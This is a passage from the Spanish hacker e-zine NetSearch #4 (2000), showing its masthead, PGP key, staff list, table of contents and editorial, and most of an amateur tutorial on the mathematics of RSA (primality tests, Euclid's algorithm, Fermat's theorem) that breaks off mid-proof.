
       #######           ##  #######   [The NetSearch E-Zine #4]  ##
      ########          ##  ###                                   ###
      #### ##  ###### ##### #######  ######  ###### ##### ######  #######
     ####  ## ###  ##  ##    ###### ###  ## ###  ## ####  ##      ###  ##
     ###  ##  ####### ##        ### ####### ##   ## ##    ##      ###   ##
    ####  ## ##       ##       ### ##       ##   ## ##    ###     ###   ##
    #### ##  ####### ###### #####  ######   ######## ##   ####### ###   ##



		
			     -  Segunda Epoca  -
            +---------------------------------------------------+
            |   The NetSearch E-Zine - Numero IV - Volumen I    |
            |                    26/11/2000                     |
            +---------------------------------------------------+

        	   - [ http://www.netsearch-ezine.com ] -
 


               "La sabiduria es el principio de la felicidad"



x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x

+----------------------------------------------------------------------------+
|									     |
| NOTA: Ninguno de los autores que han colaborado en este numero se hacen    |
|       responsables de los actos que algunas personas puedan cometer una    |
|       una vez hayan leido sus respectivos articulos.		             |
| 									     |
+----------------------------------------------------------------------------+

			           

 + INFORMACION ACERCA DE NETSEARCH


 - WEB OFICIAL:

		http://www.netsearch-ezine.com
                http://netsearch.page.to	 -> (redireccionador)     	
	
 - CANAL DE IRC:

                #netsearch , en el IRC-Hispano

 - MAILS OFICIALES:

	
	===========================================================
	==						         == 
	==       Editor     ->  editor@netsearch-ezine.com	 ==	
	==       Webmaster  ->  webmaster@netsearch-ezine.com    ==
	==	 Staff      ->  staff@netsearch-ezine.com        ==
	==							 ==
	===========================================================


 - DISTRIBUIDORES OFICIALES:

		http://hello.to/hacker_novatos


 - LLAVE PGP:

<++> llavesPGP/netsearch.asc $c47382c0f38094f037d2ec3326aee840
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.2 (GNU/Linux)
Comment: For info see http://www.gnupg.org

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
=PFmI
-----END PGP PUBLIC KEY BLOCK-----
<-->


 - STAFF:


        ===========================================================
        ==                                                       ==
	==     DarK_FeaR  ->  dark_fear@netsearch-ezine.com      ==
        ==     Sp4rK      ->  sp4rk@netsearch-ezine.com          ==
        ==     |CoDeX|    ->  codex@netsearch-ezine.com          ==
        ==     RaiSe      ->  raise@netsearch-ezine.com          ==  
        ==     cafo       ->  cafo@netsearch-ezine.com           ==
	==     QuasaR     ->  quasar@netsearch-ezine.com         ==
	==     PowR       ->  powr@netsearch-ezine.com           ==
	==     Pope       ->  pope@netsearch-ezine.com           ==
	==     MoebiuZ    ->  moebiuz@netsearch-ezine.com        ==
	==     kekabron   ->  kekabron@netsearch-ezine.com       ==
	==     doing      ->  doing@netsearch-ezine.com          ==
	==						         ==
        ===========================================================


 - COLABORADORES EN ESTE NUMERO:
	
	* HandeR   -   hander@jazzfree.com

 
 - SALUDOS:
   
	* A los e-ezine de habla hispana
	* A todos los que han hecho posible este NetSearch #4 ;)


 - RECOMENDADO EL USO DEL EDIT DE MS-DOS O EL JED DE LINUX



x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x


 + TOC


   +------------------------------------------------------+---------------+
   |  FILE    |  SIZE  |           TITULO                 |     AUTOR     |
   |==========+========+==================================+===============|
   | 0x00.txt |   8K   |   Indice                         |   NetSearch   |
   |----------+--------+----------------------------------+---------------|
   | 0x01.txt |   5K   |   Editorial                      |   Editor      |
   |----------+--------+----------------------------------+---------------|
   | 0x02.txt |  25K   |   Algoritmo RSA                  |   PowR        |
   |----------+--------+----------------------------------+---------------|
   | 0x03.txt |  10K   |   NFS en Sistemas Solaris        |   HandeR      |
   |----------+--------+----------------------------------+---------------|
   | 0x04.txt |  29K   |   Shellcodes en Linux/i386       |   RaiSe       |
   |----------+--------+----------------------------------+---------------|
   | 0x05.txt |   5K   |   NetSearch al habla             |   NetSearch   |
   |----------+--------+----------------------------------+---------------|
   | 0x06.txt |  20K   |   Interconexion Palm Pilot       |   QuasaR      |
   |----------+--------+----------------------------------+---------------|
   | 0x07.txt |  50K   |   I-Worms en Windows             |   MoebiuZ     |
   |----------+--------+----------------------------------+---------------|
   | 0x08.txt |  10K   |   Mi profe de Informatica        |   RaiSe       |
   +----------+--------+----------------------------------+---------------+
   | 0x09.txt |  21K   |   DNS Manager. Windows NT 4.0    |   |CoDeX|     |
   +----------+--------+----------------------------------+---------------+
   | 0x10.txt |   8K   |   En contacto con aViNash (dSR)  |   NetSearch   |
   +----------+--------+----------------------------------+---------------+
   | 0x11.txt |  31K   |   Buffer Overflows (b0f's)       |   kekabron    |
   +----------+--------+----------------------------------+---------------+
   | 0x12.txt |  32K   |   Proyecto Echelon (1/2)         |   Pope        |
   +----------+--------+----------------------------------+---------------+
   | 0x13.txt |  11K   |   Bugs && Xploits                |   NetSearch   |
   +----------+--------+----------------------------------+---------------+
   | 0x14.txt |  20K   |   Heaps Overflows (1/2)          |   cafo        |
   +----------+--------+----------------------------------+---------------+
   | 0x15.txt |   1K   |   Despedida                      |   Editor      |
   +----------+--------+----------------------------------+---------------+



  		      - [ [ NetSearch Ezine #4 ] ] -


      ==================================================================
      ==  Para extraer los articulos del ezine en archivos separados  ==
      ==  ejecutar "./nextract -s ns004.txt"                          ==
      ==================================================================
	

                  - [ http://www.netsearch-ezine.com ] -





0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x01 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Editorial ]==============================================================
=-[ por Editor ]-============================================================




Holas, que tal?.. cuanto tiempo,eh? :). Lo primero presentarme, soy RaiSe y
como podeis ver, soy el nuevo editor del NetSearch Ezine. Ha habido grandes
cambios en este numero, muchos os estareis preguntando porque tanta tardanza
desde el NS #3.. la verdad es que yo tambien me lo pregunto.

Hace ya un año desde el numero anterior, como pasa el tiempo.. Aunque parez-
ca lo contrario, durante este año no hemos estado parados, ni mucho menos.  
Muchos de nosotros estuvimos o estamos inmersos en otros proyectos, en los
cuales depositamos toda nuestra ilusion y ganas de trabajar, y quizas por eso
fuimos dejando sin darnos cuenta un poco de lado a NetSearch.

Ahora volvemos con toda la ilusion y ganas de hacerlo bien del principio, para
empezar se ha definido una estructura jerarquica un poco mas desarollada. Yo
no digo que la anarquia sea mala, pero no se puede llevar un ezine sin tener
un staff que se comprometa seriamente a escribir articulos y a echar una mano
en lo que haga falta si las cosas se ponen dificiles. Por supuesto las
colaboraciones externas se haran imprescindibles, pero si por algun casual
estas fallan para un determinado numero, tendremos un staff que hara que el
ezine no desaparezca y siga adelante.

Como habreis podido observar la web oficial tambien ha cambiado, tanto de ser-
ver como de webmaster. Ahora el encargado de llevarla es Sp4rK, y personal-
mente yo creo que ha ganado bastante ;). Por el momento la direccion oficial
es < http://www.netsearch-ezine.com >, y el redireccionador oficial -> 
< http://netsearch.page.to >. La web es la misma, el redireccionador solo esta
por si algun dia el dominio deja de funcionar, que esperemos que no.

Otro tema.. Si quereis colaborar en forma de articulos podeis mandarlos a la
direccion [ editor@netsearch-ezine.com ]. Solo tienen que cumplir ciertos
requisitos 'tecnicos' que nos haran la vida mas facil, estos son:


    + Estar escritos con un maximo de 80 columnas.

    + No usar caracteres fuera del estandar ASCII (7 bits) a excepcion de
      la eñe. Es decir, nada de acentos ;).

    + Siempre que el texto se base en otro ya publicado primero se consul-
      tara con el autor del mismo, y en caso de que no tenga inconveniente
      se procedera a su publicacion citando la fuente en el articulo. Lo
      mismo para una traduccion, con la particularidad de que en este caso se
      indicara claramente que se trata de una traduccion.


En cuanto a la extraña mania que alguna gente le tiene a las traducciones,
simplemente no la entiendo. Yo personalmente, si tengo que elegir entre leer
un texto en ingles o en un español bien traducido, prefiero el español. Me
imagino que los que no dominen del todo el ingles les pasara lo mismo. Otra
cosa seria llenar el ezine de traducciones, cosa que no pasara, pero alguna y
de calidad si. Asi que ya sabeis, las traducciones SI son bienvenidas ;).

Umm, que mas?.. ah sip..

Para enviar un mail sobre cualquier cosa que se os ocurra a la totalidad del
staff: [ staff@netsearch-ezine.org ]. Para el siguiente numero, si hay el
suficiente numero de mensajes, se abrira una nueva seccion que se llamara
"NetSearch Mail/INBOX", en la cual los miembros del staff iremos respondiendo
a los mails de los lectores. Asi que ya sabeis, a escribir todas vuestras du-
das y consultas..

Para enviar un mensaje sobre algo relacionado con la web, teneis a vuestra
disposicion [ webmaster@netsearch-ezine.org ], que Sp4rK se encargara gus-
tosamente de responder ;).

Y dos cosillas mas. La primera es comentaros que por el momento seguiremos
utilizando el formato de un unico archivo de texto. El motivo es que en
determinados momentos puede ser mas comodo de leer que tenerlo todo en
ficheros distintos. Aun asi, se ha añadido una nueva caracteristica al
nextract, y es la capacidad de dividir el ezine en archivos separados, cada
articulo ira en su correspondiente fichero de texto, siguiendo una numeracion
0x00.txt, 0x01.txt, 0xn.txt.. Para ello solo teneis que compilar el nextract.c
que acompaña al ezine y ejecutar "./nextract -s ns004.txt", con lo que se
crearan los ficheros correspondientes en el directorio de trabajo actual
(funciona tanto en windows como en *nix). Para extraer los fuentes del ezine,
llaves pgp, etc., como siempre, ejecutar "./nextract ns004.txt".

Por cierto, teneis que darle las gracias a cafo que se ha currado el solito
esta nueva version del nextract, thanks cafo ;).

Y la segunda: Aunque parezca lo contrario, el reto del RC5-64 todavia sigue
abierto, y NetSearch aun sigue en ello. En realidad vamos los ultimos de la
liguilla de ezines hispanos.. asi que ya sabeis, todos a darse de alta y a
hacer bloques como locos ;). Os recuerdo que la direccion para darse de alta
es http://rc5.distributed.net, y el numero de identificacion de NetSearch el
11007.

Pues nada mas, esperamos poder estar ahi durante mucho mas tiempo y contri-
buir con nuestro granito de arena a que todos, incluidos nosotros, aprenda-
mos cosas nuevas e interesantes ;).

Os dejo con el ezine. Un saludo y hasta el NetSearch Ezine #5.


El Editor



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x02 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Algoritmo RSA ]-=========================================================
=-[ por PowR ]-==============================================================




Bueno, en este mi primer articulo para netsearch voy a tratar de,
partiendo de la idea general del cifrado y las razones de la
conveniencia de su utilizacion, concretar las interioridades de quizas
el algoritmo mas estudiado (por diversas causas tales como su robustez y
relativamente sencillos planteamientos): el algoritmo RSA.

Me voy a saltar todo el tema de hablar sobre la criptografia en general
porque me parece que ya todos estais hartos de oirlo jeje. Lo que
siempre esta bien es un poco de historia pero tambien voy a prescindir
de ella xD dado que cafo ya cubrio todos estos aspectos en la serie de
Criptografia de anteriores numeros. Asi que no me voy a meter a definir
conceptos como pueda ser criptografia de clave publica y demas. Mas o
menos, este rollo q voy a soltar va a tener la siguente estructura:

1.El algoritmo RSA
1.1 Caracteristicas basicas
1.2 Resumen del funcionamiento del RSA

2.Factorizacion	
2.1 Tests de primalidad
2.2.1 Primos "fuertes"
2.2.2 Metodos de comprobacion de la primalidad	
2.2.2.1 Metodo de Lehmann			
2.2.2.2 Metodo de Rabin-Miller			
2.2.2.3 Consideraciones practicas		
2.2.3 Algunos metodos de factorizacion		

3.Algoritmo de Euclides				

4.Teorema de Fermat				
4.1 Demostracion del Teorema de Fermat 		

5.Demostracion del RSA				
5.1 Ejemplos del RSA				

6.Notas finales			

Asi que al tema:


1.El algoritmo RSA
^v^v^v^v^v^v^v^v^v
Desde q  aparicio en 1978, el sistema de llave publica RSA ha ganado
gran popularidad, por una parte por la gran seguridad que ofrece al
basar esta en un problema matematico dificil de resolver que habia
dejado de tener interes en la comunidad mundial, como lo es el Problema
de la Factorizacion Entera (PFE): La descomposicion de un numero entero
dado en producto de sus divisores primos es un problema sin dificultades
teoricas, pero que en el caso de los numeros primos muy grandes se
convierte en un proceso lento que requiere multitud de calculos
sencillos. A causa del sistema RSA se ha retomado e incrementado su
investigacion. Por otra parte, aunque implementar RSA requiere de mucho
cuidado en detalles que son necesarios, la idea de su funcionamiento es
muy simple de entender, lo que lo hace muy popular principalmente en
sectores donde no hay abundancia de matematicas (lease q hasta mi abuela
seria capaz de usar el PGP :P)

1.1 Caracteristicas basicas.
^v^v^v^v^v^v^v^v^v^v^v^v^v^v	
Como ya dije antes, RSA se basa en la dificultad para factorizar grandes
numeros. Las claves publica y privada se calculan a partir de un numero
que se obtiene como producto de dos numeros primos grandes (denominados
normalmente p y q). El atacante que pretenda romper el criptosistema se
enfrentara, si quiere recuperar un texto plano a partir del criptograma
y la llave publica, a un problema de factorizacion (esto lo tratare
luego en el punto 2).

La clave publica es un par (e, n); la clave privada  es otro par (d, n).
Los numeros e, d, son las claves de cifrado y descifrado
respectivamente, y n es el mismo en las dos claves e igual al producto
p * q. Cada  mensaje se puede representar mediante un entero m entre  0
y n - 1. Las funciones de cifrado E y descifrado D se definen del
siguiente modo:

E(m) = m^e mod n = C
D(C) = C^d mod  n

Bueno, aqui cuestiones de notacion... me parece que ni decir tiene que
^ es indicativo de potencia, m^e -> m elevado a e. Por si alguien no
esta muy puesto en matematicas, mod es el resto de una division
entera... es decir, 5 mod 2 = 1 (5 entre 2 es 2 y resto 1 xDDDDDDD)

En la correcta eleccion de los valores para d (clave privada) reside
gran parte de la eficacia del algoritmo (asi como tambien en el tamaño
de los numeros primos p y q). El valor de d se elige al azar, siendo un
numero primo comun (coprimo, cuando dos numeros tienen un maximo comun
divisor igual a 1) con el producto (p-1)*(q-1). Es decir, d no tiene
divisores en comun con p-1 ni con q-1. 	El entero e se calcula partiendo
de p, q y d mediante el Algoritmo de Euclides (ver punto 3). El proceso
consiste en aplicar dicho algoritmo a las entradas d y (p-1)*(q-1). Ese
algoritmo devuelve dos enteros s y t tales que:

sd + t(p-1)*(q-1)

es el maximo comun divisor entre d y (p-1)*(q-1). El valor de s que se
obtiene con el algoritmo susodicho es el que se le asigna a e. Dado que
d es coprimo de (p-1)*(q-1), el maximo comun divisor es 1. Es decir,
acabamos obteniendo que:

de + t(p-1)*(q-1) = 1

Atencion, que aunque el valor de n  es conocido por todo el mundo, los
primos p y q no lo son. La dificultad de su factorizacion es uno de los
puntos fuertes que hace practicamente imposible calcular el valor de d
aun conociendo el de e y el de n.


1.2 Resumen del funcionamiento de RSA.
^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v
El funcionamiento del algoritmo seria en esencia como sigue:
El mensaje a cifrar es transformado en un numero m comprendido entre 0
y n-1 (es decir, menor que n.). Un metodo para pasar de un caracter
alfabetico a una cifra es mirar su correspondencia en el codigo
alfanumerico q se este utilizando: ASCII/LATIN-1/UNICODE etc etc. Esta
transformacion de un mensaje en un numero entero impone una limitacion
en la longitud del mensaje original; sin embargo, un mensaje largo
podria romperse en varios mensajes mas cortos, cada uno de ellos en
correspondencia con el un entero menos que n. La clave de cifrado (e,n)
es publica y por lo tanto el mensaje se encripta tomando el resto de la
division de m^e por n. El resultado se denominara C, el mensaje cifrado.
Es este es que es transmitido a su destinatario. Manteniendo en secreto
la clave de descifrado d (y los primos p y q ), tan solo la persona
conocedora de esta podra recuperar el valor del mensaje original m en
funcion del mensaje cifrado C. Esto se consigue calculando el resto de
la division entera de C^d por n. La certeza de que obtenemos de este
modo nuevamente m se tiene por el Teorema de Fermat (ver punto 4).

2.Factorizacion
^v^v^v^v^v^v^v^

2.1 Tests de Primalidad.
^v^v^v^v^v^v^v^v^v^v^v^
Como ya dije antes, para elegir n se calculan primero dos numeros primos
muy grandes, que posteriormente se multiplican. Se necesitan pues
mecanismos para poder calcular esos numeros primos grandes. La
factorizacion es el problema inverso a la multiplicacion: dado n, se
trata de buscar un conjunto de numeros tales que su producto valga n.
Normalmente, y para que la solucion sea  unica, se impone la condicion
de que los factores de n que obtengamos sean todos primos. No existen
algoritmos eficientes para efectuar este tipo de calculos, siempre y
cuando los factores hayan sido escogidos correctamente (ver punto
2.1.1). Esto permite confiar en que los factores de n seran imposibles
de calcular aunque se conozca el propio n. En cuanto al calculo de
primos grandes, bastaria con aplicar un algoritmo de factorizacion para
saber si un numero es primo o no. Este mecanismo es inviable, puesto que
se acaba de decir que no hay algoritmos eficientes de factorizacion. Por
suerte, si existen algoritmos probabilisticos que permiten decir con un
grado de certeza bastante elevado si un numero cualquiera es primo o
compuesto. Cabria preguntarse, ya que para los algoritmos asimetricos de
cifrado se necesitaria  generar muchos numeros primos, si realmente hay
suficientes. De hecho se puede pensar que, a fuerza de generar numeros,
llegaria un momento en el que repitamos un primo generado con
anterioridad. Podemos estar tranquilos, porque si a cada  atomo del
universo se le asignase  mil millones de numeros primos cada
microsegundo desde su origen hasta hoy, harian falta un total de 10^109
numeros primos diferentes, mientras que el total estimado de numeros
primos de 512 bits o menos es aproximadamente de 10^151 . Tambien
podriamos pensar en calcular indiscriminadamente numeros primos para
luego emplearlos en algun algoritmo de factorizacion rapida. Por
desgracia, si quisieramos construir un disco duro que albergara diez mil
Gigabytes por cada gramo de masa y milimetro cubico para almacenar todos
los primos de 512 bits o menos, el artilugio pesaria mas de 10^135 Kg y
ocuparia casi 10^130 metros cubicos, es decir, seria miles de billones
de veces mas grande y pesado que la Via Lactea xDDDD.

2.2.1 Primos "fuertes"
^v^v^v^v^v^v^v^v^v^v^v
Aunque p y q sean primos grandes, existen algunos casos en los que es
relativamente facil factorizar el numero n = pq. Se proponen entonces
una serie de condiciones para p y q que dificultan la factorizacion de
n. Se dice que p y q son numeros primos fuertes si cumplen:

* El maximo comun divisor de p-1 y q-1 debe de ser pequeño
* p-1 y q-1 deben tener algun factor primo grande  p' y q'
* Tanto  p'-1 como  q'-1 deben tener factores primos grandes.
* Tanto p'+1 como  q'+1 deben tener factores primos grandes.

Las dos primeras condiciones se cumplen si tanto (p-1) / 2 como
(q-1) / 2 son numeros primos.

2.2.2 Metodos de comprobacion de la primalidad
^v^v^v^v^v^v^v^v^v^v^v^v^v^v^^v^v^v^v^v^v^v^

2.2.2.1 Metodo de Lehmann
^v^v^v^v^v^v^v^v^v^v^v^v^	
Es uno de los tests mas sencillos para saber si un numero p es o no primo.

1.Escoger un numero aleatorio a < p.
2.Calcular b = a^((p-1)/2) * (mod p) (cuidado, solo ((p-1)/2) es el
exponente de a.
3.Si b != 1(mod p) y b != -1(mod p), p no es primo (mas cuestiones de
notacion, != significa "distinto de")
4.Si b \ 1(mod p) o b \ -1(mod p),
la probabilidad de que p sea primo es igual o superior al 50%

Repitiendo el algoritmo n veces, la probabilidad de que p supere el test
y sea compuesto (es decir, no primo) sera de 1 / 2^n.

2.2.2.2 Metodo de Rabin-Miller
^v^v^v^v^v^v^v^v^v^v^v^v^v^v^
Es el algoritmo mas empleado, debido a su facilidad de implementacion.
Sea p el numero que queremos saber si es primo o no. Se calcula b el
numero de veces que 2 divide a (p-1), es decir, 2^b es la mayor potencia
de 2 que divide a (p-1). Calculando entonces m, tal que p=1+2^(b) * m

1.Escoger un numero aleatorio a < p.
2.Sea j=0 y z=a^(m) * (mod p)
3.Si z=1, o z=p-1, entonces  p pasa el test y puede ser primo.
4.Si j > 0 y z = 1, p no es primo
5.Sea j=j + 1. Si j = b y z != p - 1, p no es primo
6.Si j < b y z != p - 1, z = z^(2) * (mod p); volver a (4)
7.Si  j < b y z = p - 1, entonces p pasa el test y puede ser primo
8.Si se llega a este punto, p no es primo.

La probabilidad de que un numero compuesto pase este algoritmo para un
numero a es del 25%. Es decir, que se necesitaran menos pasos para
llegar al mismo nivel de confianza que con el algoritmo de Lehmann.


2.2.2.3 Consideraciones practicas
^v^v^v^v^v^v^v^^v^v^v^v^v^v^v^
A efectos practicos el algoritmo que se suele emplear para saber si un
numero es o no primo es el siguiente:
1.Generar un numero aleatorio p de n bits
2.Intentar dividir p por una tabla de primos precalculados (normalmente
los extraidos de los 2000 primeros numeros). Esto elimina gran cantidad
de numeros no primos de una forma muy rapida. (mas del 99.8% de los
numeros impares no primos es divisible por algun numero primo menor que
2000)
3.Ejecutar el test de Rabin-Miller al menos cinco veces.


3.Algoritmo de Euclides
^v^v^v^v^v^v^v^v^v^v^v^

Mediante este algoritmo se obtiene el entero mas grande que divide
exactamente a dos numeros ( es decir, el maximo comun divisor). Existen
dos versiones de este algoritmo. La primera calcula el maximo comun
divisor de dos numeros a y b. El funcionamiento es el siguiente:

1.Calculo de r como el resto de la division a entre b.
2.Si r = 0, fin del algoritmo, b es la respuesta
3.Se redefine a como b y b como r
4.Vuelta a punto (1)

Aplicandolo al caso a=36 y b=20 las sucesivas divisiones son:

 ___________________________________________________
|       |       |                |                  |
|   a   |   b   |    Cociente    |     Resto r      |
|_______|_______|________________|__________________|
|       |       |                |                  |
|  36   |  20   |        1       |        16        |
|_______|_______|________________|__________________|
|       |       |                |                  |
|  20   |  16   |        1       |         4        |
|_______|_______|________________|__________________|
|       |       |                |                  |
|  16   |   4   |        4       |         0        |
|_______|_______|________________|__________________|


La ultima salida de b es el valor del maximo comun divisor.

En la segunda version se introducen dos variables mas: s y t. Esta
version calcula valores para las variables s y t de modo que el maximo
comun divisor entre a y b se pueda calcular como:

s * a + t * b

Mas en profundidad, esta segunda version es:
Tomando como entradas dos enteros no negativos A y B, se devuelven a la
salida otros dos enteros s y t tales que sA + tB es el maximo comun
divisor entre los valores originales de A y B. Tambien devuelve el valor
del maximo comun divisor en una variable b.

1. a := A; b:= B; s := 0; t :=1;
2. q :=a div b; r := a mod b
3. Fin si r=0.
4. a := b; b := r
5. Vuelta al paso (2)

Cuestiones de notacion: el ":=" es una asignacion, se puede entender
como un signo igual pero con mas sutileza :P ; y el operador div
devuelve el cociente de una division (del mismo modo que mod devuelve el
resto)

En el ejemplo que nos ocupa, tendriamos:

a=36 ; b=20 ; r=16

al hacer la sustitucion a := b; b := r, quedamos con a=20 y b=16

20 mod 16 = 4 ; 4 es el valor del maximo comun divisor (obviamente
coincidente con el ejemplo anterior)
Planteamos ahora la ecuacion s*36 + t*20=4, dando inicialmente valor
t=1 Asi pues, tendriamos s=-16 / 36. Dado que los valores de s y t deben
de ser enteros, aumentamos en uno el valor de t y volvemos a plantear la
ecuacion. Con t=2 obtenemos s=(-1). Ambos valores son enteros y cumplen
con la ecuacion, siendo pues los valores buscados.

(-1) * 36 + 2 * 20 =
(s)    (a) (t)  (b)


4. Teorema de Fermat
^v^v^v^v^v^v^v^v^v^v

El teorema de Fermat que nos interesa se basa en el hecho de que para
cualquier numero natural m, la diferencia m^(p) - m es divisible
exactamente por p siempre y cuando p sea primo. Una variante de este
enunciado dice que si p y que son dos primos distintos y m  es un numero
natural cualquiera, coprimo de p y que, la diferencia m^((p-1)(q-1)) -1
es divisible exactamente por el producto pq.


4.1 Demostracion
^v^v^v^v^v^v^v^v

Para entrar mas en materia con el teorema, voy a ver si consigo una
demostracion que se pueda entender. Mas cosas de notacion matematica, no
entro en cuestion de explicar conceptos como "sumatorio" ni su
funcionamiento porque supongo que si has aguantado este rollo hasta aqui
es porque ya sabes lo que es.

                                 inf
                                _____
                                \
 Representare el sumatorio con   \      por poner un ejemplo.
                                 /
                                /____
                                 i = 0
 (
(     <- esto intenta ser un parentisis "tamaño grande" :P
(
 (

Bueno vamos alla:

Por induccion en m:
Cuando m=1 , 1^(p) - 1 = 0. 0 es divisible por p.
Suponiendo que el resultado es cierto para m, para m+1:

           p
         _____
         \        (  p  )
(m+1)^p = \      (       )  m^i
          /      (       )
         /____    (  i  )
          i=0	

            p - 1
            _____
            \        (  p  )
       = 1 + \      (       )  m^p
             /      (       )
            /____    (  i  )
             i=1	

Restando m + 1:      p - 1
                    ______
                    \         (  p  )
                     \       (       )
(m+1)^(p) - (m+1) =  / 	     (       )  + (m^(p) - m)
                    /_____    (  i  )
                     i = i

Se puede ver que seria suficiente demostrar que la sumatoria es
divisible por p, pero eso es cierto porque cada numero combinatorio es
divisible por p, tal y como se demostrara a continuacion:

Por induccion en i.

             (  p  )
            (       )
Cuando i=1, (       )  = p
             (  1  )

                (  p  )
               (       )
Suponiendo que (       ) es divisible por p y probemos que en ese caso
                (  1  )


 (  p  )
(       )
(       )  tambien lo es cuando i + 1 es menor que p.
 ( i+1 )

Asi pues:

 (  p  )               (  p  )
(       )             (       )
(       ) ( i + 1 ) = (       ) (p - i)
 ( i+1 )               (  1  )

En funcion de la hipotesis inductiva, p divide al miembro derecho. Asi
pues, divide al miembro de la izquierda. Dado que i + 1 < p y p es
primo, ambos numeros resultan ser coprimos.. Asi pues, p debe dividir a

 (  p  )
(       )
(       )
 ( i+1 )

Por tanto:
Si p es un numero primo y m es coprimo con p, entonces la diferencia
m^(p-1)-1 es divisible por p.
En base al teorema m(m^(p-1)-1)=m^(p)-m es divisible por p. Como m y p
son coprimos, m^(p-1)-1 debe de ser divisible por p.


5. Demostracion RSA.
^v^v^v^v^v^v^v^v^v^

Si los enteros e, d y n se eligen como se ha indicado en la descripcion
del algoritmo, entonces, todo m < n verifica que:

D(E(m)) = m ; E(D(m))=m

Dada la simetria, es suficiente demostrar la primera de estas
igualdades porque un razonamiento analogo demostraria la segunda.

D(E(m)) = D(m^(e) mod pq)
        = (m^(e) mod pq)^(d) mod pq
        = m^(ed) mod pq

Para la relacion ed + t(p-1)(q-1) = 1:

ed =  1 - t(p-1)(q-1) ; D(E(m)) = mm^((-t)(p-1)(q-1)) mod pq
                                = m(m^(-t))^((p-1)(q-1)) mod pq
